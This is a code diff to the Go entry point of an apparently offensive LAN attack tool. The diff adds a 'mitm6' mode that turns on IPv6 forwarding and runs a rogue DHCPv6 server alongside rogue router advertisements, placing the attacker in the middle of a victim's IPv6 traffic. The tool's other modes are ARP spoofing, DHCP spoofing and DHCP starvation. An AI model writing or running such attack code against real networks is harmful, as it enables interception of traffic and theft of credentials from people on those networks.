@@ -29,7 +29,7 @@ func main() {
 	// count
 	var count int
 
-	flag.StringVar(&mode, "mode", "", "attack mode: arp, dhcp, dhcp6 (pool: 2001:db8::100 - 2001:db8::200), dhcp-starve (required)")
+	flag.StringVar(&mode, "mode", "", "attack mode: arp, dhcp, dhcp-starve, dhcp6, ra, mitm6 (required)")
 	flag.StringVar(&targetIP, "t", "", "target ip address (required for arp)")
 	flag.StringVar(&offeredIP, "offer", "", "IP to offer target (required for dhcp)")
 	flag.IntVar(&count, "count", 0, "how many DHCP Discover to send (required for dhcpv4)")
@@ -193,6 +193,30 @@ func main() {
 		fmt.Println("\nStarting Rogue RA attack...")
 		fmt.Println("Press Ctrl+C to stop.")
 
+		go dhcp6.SendRouterAdvertisement(localNetwork.InterfaceName, localNetwork.IPv6Address)
+
+		sigChan := make(chan os.Signal, 1)
+		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+		<-sigChan
+
+	case "mitm6":
+		if offeredIP == "" {
+			fmt.Println("Error: offered ip is required")
+			os.Exit(1)
+		}
+
+		printAttackerInfo(localNetwork)
+
+		if err := arp.EnableIPv6Forwarding(); err != nil {
+			fmt.Printf("Error: %v\n", err)
+			os.Exit(1)
+		}
+
+		fmt.Println("\nStarting MITM6 attack (DHCPv6 + Rogue RA)...")
+		fmt.Println("Press Ctrl+C to stop.")
+		fmt.Println()
+
+		go dhcp6.ListenDHCPv6(localNetwork.InterfaceName, localNetwork.MacAddress, net.ParseIP(offeredIP))
 		go dhcp6.SendRouterAdvertisement(localNetwork.InterfaceName, localNetwork.IPv6Address)
 
 		sigChan := make(chan os.Signal, 1)
